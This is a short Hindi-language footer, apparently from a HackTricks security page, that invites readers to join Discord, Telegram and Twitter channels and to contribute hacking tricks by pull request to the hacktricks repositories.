- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
